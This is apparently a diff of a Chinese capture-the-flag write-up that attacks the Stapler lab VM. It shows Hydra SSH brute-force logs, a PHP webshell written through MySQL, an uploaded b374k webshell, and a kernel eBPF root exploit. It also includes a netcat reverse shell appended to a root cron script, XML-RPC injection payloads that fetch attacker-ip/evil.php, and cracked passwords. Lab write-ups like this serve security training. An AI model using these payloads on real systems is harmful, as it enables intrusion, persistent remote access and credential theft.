-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 7
-[ATTEMPT] target 192.168.0.150 - login "JKanode" - pass "" - 107 of 152 [child 3] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "JKanode" - pass "edonaKJ" - 108 of 152 [child 4] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "JKanode" - pass "JKanode" - 108 of 152 [child 7] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "CJoo" - pass "CJoo" - 109 of 152 [child 8] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "CJoo" - pass "" - 110 of 152 [child 9] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "CJoo" - pass "ooJC" - 111 of 152 [child 2] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "Eeth" - pass "Eeth" - 112 of 152 [child 13] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "Eeth" - pass "" - 113 of 152 [child 1] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "Eeth" - pass "hteE" - 114 of 152 [child 14] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 14
-[ATTEMPT] target 192.168.0.150 - login "LSolum2" - pass "LSolum2" - 115 of 152 [child 5] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "LSolum2" - pass "hteE" - 115 of 152 [child 14] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "LSolum2" - pass "" - 116 of 152 [child 0] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "LSolum2" - pass "2muloSL" - 117 of 152 [child 11] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "JLipps" - pass "JLipps" - 118 of 152 [child 6] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 6
-[RE-ATTEMPT] target 192.168.0.150 - login "JLipps" - pass "JLipps" - 118 of 152 [child 6] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "JLipps" - pass "" - 119 of 152 [child 10] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "JLipps" - pass "sppiLJ" - 120 of 152 [child 4] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 4
-[ATTEMPT] target 192.168.0.150 - login "jamie" - pass "jamie" - 121 of 152 [child 7] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 7
-[ATTEMPT] target 192.168.0.150 - login "jamie" - pass "" - 122 of 152 [child 3] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "jamie" - pass "sppiLJ" - 122 of 152 [child 4] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 3
-[RE-ATTEMPT] target 192.168.0.150 - login "jamie" - pass "jamie" - 122 of 152 [child 7] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "jamie" - pass "eimaj" - 123 of 152 [child 8] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "jamie" - pass "" - 123 of 152 [child 3] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "Sam" - pass "Sam" - 124 of 152 [child 9] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "Sam" - pass "" - 125 of 152 [child 13] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[ATTEMPT] target 192.168.0.150 - login "Sam" - pass "maS" - 126 of 152 [child 2] (0/2)
-[VERBOSE] Retrying connection for child 13
-[ATTEMPT] target 192.168.0.150 - login "Drew" - pass "Drew" - 127 of 152 [child 1] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "Drew" - pass "" - 127 of 152 [child 13] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "Drew" - pass "" - 128 of 152 [child 14] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "Drew" - pass "werD" - 129 of 152 [child 5] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "jess" - pass "jess" - 130 of 152 [child 0] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "jess" - pass "" - 131 of 152 [child 11] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "jess" - pass "ssej" - 132 of 152 [child 6] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 6
-[RE-ATTEMPT] target 192.168.0.150 - login "jess" - pass "ssej" - 132 of 152 [child 6] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "SHAY" - pass "SHAY" - 133 of 152 [child 10] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "SHAY" - pass "" - 134 of 152 [child 4] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "SHAY" - pass "YAHS" - 135 of 152 [child 7] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 7
-[RE-ATTEMPT] target 192.168.0.150 - login "SHAY" - pass "YAHS" - 135 of 152 [child 7] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "Taylor" - pass "Taylor" - 136 of 152 [child 2] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "Taylor" - pass "" - 137 of 152 [child 8] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[ATTEMPT] target 192.168.0.150 - login "Taylor" - pass "rolyaT" - 138 of 152 [child 5] (0/2)
-[VERBOSE] Retrying connection for child 8
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 5
-[ATTEMPT] target 192.168.0.150 - login "mel" - pass "mel" - 139 of 152 [child 1] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "mel" - pass "" - 139 of 152 [child 8] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "mel" - pass "" - 140 of 152 [child 13] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "mel" - pass "lem" - 141 of 152 [child 14] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "kai" - pass "kai" - 142 of 152 [child 3] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "kai" - pass "rolyaT" - 142 of 152 [child 5] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "kai" - pass "" - 143 of 152 [child 9] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "kai" - pass "iak" - 144 of 152 [child 0] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 0
-[ATTEMPT] target 192.168.0.150 - login "NATHAN" - pass "NATHAN" - 145 of 152 [child 11] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 11
-[RE-ATTEMPT] target 192.168.0.150 - login "NATHAN" - pass "iak" - 145 of 152 [child 0] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "NATHAN" - pass "NATHAN" - 145 of 152 [child 11] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "NATHAN" - pass "" - 146 of 152 [child 6] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 6
-[RE-ATTEMPT] target 192.168.0.150 - login "NATHAN" - pass "" - 146 of 152 [child 6] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "NATHAN" - pass "NAHTAN" - 147 of 152 [child 10] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "www" - pass "www" - 148 of 152 [child 4] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "www" - pass "" - 149 of 152 [child 7] (0/2)
-[REDO-ATTEMPT] target 192.168.0.150 - login "root" - pass "root" - 151 of 152 [child 2] (1/2)
-[REDO-ATTEMPT] target 192.168.0.150 - login "daemon" - pass "daemon" - 152 of 152 [child 11] (2/2)
+...
 [STATUS] attack finished for 192.168.0.150 (waiting for children to complete tests)
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-04 09:40:32
@@ -1250,7 +837,10 @@ Shellcodes: No Results
 2. 查看漏洞的结果是在：
    <img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/4.png" width="56%"></br>
 3. <font color="red">而且需要注意他是将内容(txt)，直接复制到文件中，并将文件后缀改成了png，因此我们在浏览器中是看不到内容的，只能将图片以文本格式打开才可以看到内容。（这在39646.py--searchsploit中写的并不详细）</font>
-4. 自己写了一个exp如下：
+4. 自己写了一个exp如下
+<details>
+<summary>exp</summary>
+
 ```python
 # coding: utf-8
 #!/usr/bin/python2
@@ -1345,6 +935,10 @@ for line in content:
 # 		urls=re.findall('"(https?://.*?)"', line)
 # 		print urllib2.urlopen(urls[0], context=ssl._create_unverified_context()).read()
 ```
+</details>
+
+<details>
+<summary>执行结果</summary>
 
 ```shell
 # 执行结果：
@@ -1434,6 +1028,8 @@ for line in content:
 
 [Done] exited with code=0 in 0.339 seconds
 ```
+</details>
+
 ```shell
    SHayslett@red:~$ mysql -u root -pplbkac
 mysql: [Warning] Using a password on the command line interface can be insecure.
@@ -1450,7 +1046,8 @@ owners.
 Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
 mysql>
-   ```
+```
+
 由于是root权限，我们考虑可以通过写webshell的方式，执行系统命令，但是需要注意：
 <font color="red">exec函数只会返回单行执行结果，而passthru会返回全部执行结果。</font>
 ```shell
@@ -1470,10 +1067,12 @@ Public
 get-pip.py
 ```
 mysql写入文件：
-```mysql
+
+```shell
 mysql> select "<?php @passthru($_POST['cmd']);" from test limit 1 into dumpfile '/var/www/https/blogblog/wp-content/uploads/w10.php';
 Query OK, 1 row affected (0.00 sec)
 ```
+
 上传一个大马：
 ```shell
 tools/b374k [master] » php -f index.php -- -o b374k.php -p e0g18 -s -b -z gzcompress -c 9
@@ -1499,6 +1098,7 @@ Result			: Succeeded : [ b374k.php ] Filesize : 111695
 Serving HTTP on :: port 8080 (http://[::]:8080/) ...
 ::ffff:192.168.0.154 - - [05/Jul/2022 13:36:15] "GET /b374k.php HTTP/1.1" 200 -
 ```
+
 <img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/5.png" width="56%"></br>
 访问大马：
 <img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/6.png" width="56%"></br>
@@ -1869,6 +1469,9 @@ b6b545dc11b7a270f4bad23432190c75162c4a2b
 
 ```
 ## 2. 内核提权
+<details>
+<summary>linepeas跑一下</summary>
+
 ```shell
 SHayslett@red:/tmp$ ./linpeas.sh
 
@@ -3627,6 +3230,9 @@ define('DB_USER', 'username_here');
 2022-07-05 18:47:35 status unpacked passwd:i386 1:4.2-3.1ubuntu5.3
 2022-07-05 18:47:35 upgrade passwd:i386 1:4.2-3.1ubuntu5 1:4.2-3.1ubuntu5.3
 ```
+</details>
+使用bpf(BPF_PROG_LOAD) Privilege Escalation提权，完整利用poc：https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
+
 ```shell
 SHayslett@red:/tmp$ unzip 39772.zip
 Archive:  39772.zip
@@ -3705,6 +3311,11 @@ we have root privs now...
 root@red:/tmp/39772/ebpf_mapfd_doubleput_exploit#
 ```
 ## 3. 定时任务提权
+根据前面linepeas的结果我们发现cron-logrotate.sh是可以root权限执行的，猜测可能是root的定时执行脚本，因此：
+```shell
+echo 'mknod /tmp/backpipe p;/bin/bash 0</tmp/backpipe | nc 192.168.0.100 443 1>/tmp/backpipe' >> cron-logrotate.sh
+```
+本地开启监听端口，耐心等待几分钟后，会发现直接返回了一个root权限的shell :scream: :scream: :scream:
 ```shell
 ┌──(root㉿kali)-[~]
 └─# nc -lvnp 443
@@ -3818,3 +3429,45 @@ ZOE:partyqueen
 Dave:damachine
 Pam:0520
 ```
+
+## 2. xml-rpc RCE 在这个靶场似乎不存在
+检测方法：
+```xml
+<methodCall>
+<methodName>system.listMethods</methodName>
+<params></params>
+</methodCall>
+```
+<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/9.png" width="56%"></br>
+漏洞验证poc1：
+```xml
+<?xml version="1.0"?>
+<methodCall>
+<methodName>test.method</methodName>
+	<params>
+		<param>
+		<value><name>','')); phpinfo(); exit;/*</name></value>
+		</param>
+	</params>
+</methodCall>
+```
+漏洞验证poc2：
+```xml
+<?xml version="1.0"?>
+<methodCall>
+<methodName>test.method</methodName>
+	<params>
+		<param>
+		<value><name>',"));echo `_begin_';echo `cd /tmp;wget attacker-ip/evil.php;chmod +x evil.php;./nikons `; echo `_end_`; exit;/*</name></value>
+		</param>
+	</params>
+</methodCall>
+```
+evil.php可以是
+```php
+<?php system($_GET['cmd'];) ?>
+```
+也可以是其他reverse-shell等
+我验证了一下，不支持test.method：
+<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/10.png" width="56%"></br>
+后来通过查看源码，的确不存在关键漏洞代码eval，也许就没有该漏洞吧
